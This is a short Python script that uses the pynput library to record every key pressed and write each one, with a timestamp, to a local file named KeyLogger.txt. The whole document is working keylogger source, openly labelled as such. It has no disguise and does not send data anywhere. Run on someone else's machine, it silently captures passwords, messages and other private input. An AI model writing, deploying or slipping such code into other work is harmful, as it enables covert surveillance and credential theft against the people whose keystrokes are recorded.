
from pynput.keyboard import Key, Listener
import logging

log_dir = ""
logging.basicConfig(filename=(log_dir + "KeyLogger.txt"), level=logging.DEBUG, format=("%(asctime)s:%(message)s"))


def on__press(key):
    logging.info(str(key))


with Listener(on__press) as listener:
    listener.join()
